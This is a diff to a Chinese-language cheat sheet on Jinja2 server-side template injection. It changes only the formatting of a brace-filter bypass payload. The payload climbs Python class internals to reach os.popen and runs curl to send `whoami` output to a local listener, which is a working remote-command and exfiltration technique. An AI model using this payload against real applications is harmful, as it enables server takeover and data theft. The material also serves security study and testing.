@@ -773,8 +773,10 @@ request.__class__.__mro__[1]
 **过滤花括号**
 
 ```php
-#用{%%}标记
-{% raw %}{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}{% endraw %}1{% raw %}{% endif %}{% endraw %}
+#用标记方式
+{% raw %}
+{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
+{% endraw %}
 ```
 
 **利用示例：**
